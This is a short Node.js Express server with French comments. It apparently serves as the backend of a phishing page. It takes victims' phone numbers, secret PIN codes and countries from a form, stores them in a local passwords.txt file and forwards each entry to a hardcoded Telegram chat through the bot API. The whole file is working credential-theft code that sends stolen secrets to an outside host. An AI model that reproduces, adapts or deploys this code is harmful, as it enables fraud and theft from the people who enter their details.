const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 10000;

// =======================
// 🔐 TELEGRAM CONFIG
// 👉 MET TON TOKEN DANS RENDER (ENV VAR)
// =======================
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
const CHAT_ID = "8585623604";

// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Dossier statique
app.use(express.static(path.join(__dirname, "..", "STOKE")));

// Fichier de sauvegarde
const FILE = path.join(__dirname, "passwords.txt");
// Route POST
app.post("/", async (req, res) => {
  const { phone, pin, country } = req.body;

    console.log("📥 DONNÉES REÇUES :", req.body);

    if (!phone || !country) {
    console.log("❌ Données manquantes");
    return res.sendStatus(400);
  }

  // Sauvegarde fichier
  const line = `COUNTRY: ${country} | PHONE: ${phone}\n🔑 code secret: ${pin}\n`;
  fs.appendFileSync(FILE, line);

  // Envoi Telegram
  try {
    await axios.post(
      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
      {
        chat_id: CHAT_ID,
        text: `📩 Nouvelle entrée\n🌍 Pays: ${country}\n📞 Téléphone: ${phone}\n🔑 code secret: ${pin}\n`
      }
     );
    console.log("✅ Message Telegram envoyé");
  } catch (error) {
    console.log("❌ Erreur Telegram :", error.message);
  }

  res.sendStatus(200);
});

// Lancement serveur
app.listen(PORT, () => {
    console.log(" Serveur online sur port " + PORT);});